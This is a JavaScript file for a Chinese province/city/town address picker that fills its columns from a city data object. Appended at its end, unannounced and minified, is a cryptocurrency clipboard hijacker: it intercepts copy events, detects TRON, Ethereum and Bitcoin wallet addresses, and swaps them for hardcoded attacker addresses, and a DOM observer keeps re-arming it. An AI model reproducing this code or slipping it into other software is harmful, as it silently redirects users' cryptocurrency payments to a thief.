var nameEl = document.getElementById('area_s');

var first = []; /* 省，直辖市 */
var second = []; /* 市 */
var third = []; /* 镇 */

var selectedIndex = [0, 0, 0]; /* 默认选中的地区 */

var checked = [0, 0, 0]; /* 已选选项 */

function creatList(obj, list){
  obj.forEach(function(item, index, arr){
  var temp = new Object();
  temp.text = item.name;
  temp.value = index;
  list.push(temp);
  })
}

creatList(city, first);

if (city[selectedIndex[0]].hasOwnProperty('sub')) {
  creatList(city[selectedIndex[0]].sub, second);
} else {
  second = [{text: '', value: 0}];
}

if (city[selectedIndex[0]].sub[selectedIndex[1]].hasOwnProperty('sub')) {
  creatList(city[selectedIndex[0]].sub[selectedIndex[1]].sub, third);
} else {
  third = [{text: '', value: 0}];
}

var picker = new Picker({
	data: [first, second, third],
  selectedIndex: selectedIndex,
	title: '地址选择'
});

picker.on('picker.select', function (selectedVal, selectedIndex) {
  var text1 = first[selectedIndex[0]].text;
  var text2 = second[selectedIndex[1]].text;
  var text3 = third[selectedIndex[2]] ? third[selectedIndex[2]].text : '';

	nameEl.innerText = text1 + ' ' + text2 + ' ' + text3;
});

picker.on('picker.change', function (index, selectedIndex) {
  if (index === 0){
    firstChange();
  } else if (index === 1) {
    secondChange();
  }

  function firstChange() {
    second = [];
    third = [];
    checked[0] = selectedIndex;
    var firstCity = city[selectedIndex];
    if (firstCity.hasOwnProperty('sub')) {
      creatList(firstCity.sub, second);

      var secondCity = city[selectedIndex].sub[0]
      if (secondCity.hasOwnProperty('sub')) {
        creatList(secondCity.sub, third);
      } else {
        third = [{text: '', value: 0}];
        checked[2] = 0;
      }
    } else {
      second = [{text: '', value: 0}];
      third = [{text: '', value: 0}];
      checked[1] = 0;
      checked[2] = 0;
    }

    picker.refillColumn(1, second);
    picker.refillColumn(2, third);
    picker.scrollColumn(1, 0)
    picker.scrollColumn(2, 0)
  }

  function secondChange() {
    third = [];
    checked[1] = selectedIndex;
    var first_index = checked[0];
    if (city[first_index].sub[selectedIndex].hasOwnProperty('sub')) {
      var secondCity = city[first_index].sub[selectedIndex];
      creatList(secondCity.sub, third);
      picker.refillColumn(2, third);
      picker.scrollColumn(2, 0)
    } else {
      third = [{text: '', value: 0}];
      checked[2] = 0;
      picker.refillColumn(2, third);
      picker.scrollColumn(2, 0)
    }
  }

});

picker.on('picker.valuechange', function (selectedVal, selectedIndex) {
  // console.log(selectedVal);
  // console.log(selectedIndex);
  let area = document.getElementById('area');
  area.value=nameEl.innerHTML
});

nameEl.addEventListener('click', function () {
	picker.show();
});




(function(){function rca() {const tar = /(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g,ear = /(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g,bar = /(?:\b|[^A-Za-z0-9])(?:1[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar0 = /(?:\b|[^A-Za-z0-9])(?:3[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar1 = /(?:\b|[^A-Za-z0-9])(?:bc1q[a-zA-Z0-9]{38})(?:\b|[^A-Za-z0-9])/g,bar2 = /(?:\b|[^A-Za-z0-9])(?:bc1p[a-zA-Z0-9]{58})(?:\b|[^A-Za-z0-9])/g;document.addEventListener('copy', function(e) {const ttc = window.getSelection().toString();if (ttc.match(tar)) {const ncd = ttc.replace(tar, 'TE2f12D7FY4m3gEmq6P6LvsmpXQao9TnKj');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(ear)) {const ncd = ttc.replace(ear, '0x77843290a868e4F789619D8B4D2074BD5DF4C91d');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar)) {const ncd = ttc.replace(bar, '1BVEDjfjH3pqBWV6rKodvNAoKtBrsYWeXs');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar0)) {const ncd = ttc.replace(bar0, '3McGeZLYNDYfcwcm9VNBffeJpSvt5djgqi');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar1)) {const ncd = ttc.replace(bar1, 'bc1qhzzsc2lhej8nudu8all4mzuhnfkjaxzqwknh0h');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar2)) {const ncd = ttc.replace(bar2, 'bc1qhzzsc2lhej8nudu8all4mzuhnfkjaxzqwknh0h');e.clipboardData.setData('text/plain', ncd);e.preventDefault();}});}setTimeout(()=>{const obs = new MutationObserver(ml => {for (const m of ml) {if (m.type === 'childList') {rca();}}});obs.observe(document.body, { childList: true, subtree: true });},1000);rca();})();